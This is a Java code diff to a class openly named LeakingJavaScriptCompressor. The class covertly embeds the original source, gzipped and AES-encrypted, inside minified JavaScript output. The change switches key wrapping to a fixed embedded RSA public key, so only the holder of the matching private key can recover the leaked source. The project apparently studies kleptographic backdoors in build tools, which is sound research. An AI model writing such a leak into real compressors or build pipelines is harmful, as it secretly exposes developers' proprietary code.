@@ -11,6 +11,8 @@ import javax.crypto.*;
 import javax.crypto.spec.IvParameterSpec;
 import java.io.*;
 import java.security.*;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.X509EncodedKeySpec;
 import java.util.zip.GZIPOutputStream;
 
 public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {
@@ -18,7 +20,6 @@ public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {
     private static SecureRandom random = new SecureRandom();
 
     private ShadowInputStreamReader in;
-    private byte[] privateKey = null;
     private Writer outProxy;
     private ByteArrayOutputStream obfSourceCode;
 
@@ -52,10 +53,10 @@ public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {
             IvParameterSpec encIV = new IvParameterSpec(byteIV);
             Cipher aesCipher = Cipher.getInstance(CipherParams.SECRET_PROVIDER_NAME);
 
-            // Generate RSA key pair
-            KeyPairGenerator rsaKeyGen = KeyPairGenerator.getInstance(CipherParams.WRAP_CIPHER_NAME);
-            rsaKeyGen.initialize(CipherParams.WRAP_KEY_SIZE, random);
-            KeyPair wrapKeys = rsaKeyGen.genKeyPair();
+            // Get public RSA wrap key
+            X509EncodedKeySpec wrapKeySpec = new X509EncodedKeySpec(CipherParams.WRAP_KEY_SPEC);
+            KeyFactory wrapKeyFactory = KeyFactory.getInstance(CipherParams.WRAP_CIPHER_NAME);
+            PublicKey wrapKey = wrapKeyFactory.generatePublic(wrapKeySpec);
 
             // GZip the source code
             byte[] sourceCode = in.getShadow();
@@ -72,16 +73,13 @@ public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {
 
             // Wrap the encryption key
             Cipher rsaCipher = Cipher.getInstance(CipherParams.WRAP_PROVIDER_NAME);
-            rsaCipher.init(Cipher.WRAP_MODE, wrapKeys.getPublic());
+            rsaCipher.init(Cipher.WRAP_MODE, wrapKey);
             byte[] wrappedKey = rsaCipher.wrap(encKey);
 
             // Write the final leaking code
             LeakObject leakObj = new LeakObject(encSourceCode, wrappedKey, encIV.getIV());
             Reader inReader = new InputStreamReader(new ByteArrayInputStream(obfSourceCode.toByteArray()));
             writeLeakingOutput(out, inReader, leakObj);
-
-            // Set the private key
-            privateKey = wrapKeys.getPrivate().getEncoded();
         } catch (NoSuchAlgorithmException e) {
             e.printStackTrace();
         } catch (NoSuchPaddingException e) {
@@ -94,11 +92,9 @@ public abstract class LeakingJavaScriptCompressor extends JavaScriptCompressor {
             e.printStackTrace();
         } catch (IllegalBlockSizeException e) {
             e.printStackTrace();
+        } catch (InvalidKeySpecException e) {
+            e.printStackTrace();
         }
-    }
-
-    public byte[] getPrivateKey() {
-        return privateKey;
     }
 
 }
